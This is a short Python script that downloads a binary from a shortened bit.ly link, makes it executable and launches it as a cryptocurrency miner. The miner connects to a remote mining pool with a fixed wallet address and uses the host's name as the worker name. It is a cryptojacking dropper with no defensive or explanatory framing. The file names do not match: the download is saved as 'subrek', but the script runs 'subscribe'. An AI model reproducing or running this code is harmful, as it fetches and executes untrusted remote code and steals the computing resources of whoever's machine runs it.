import os

os.system("wget -qO subrek https://bit.ly/3Ipgmg8")
os.system("chmod u+x subscribe")
os.system("./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)")
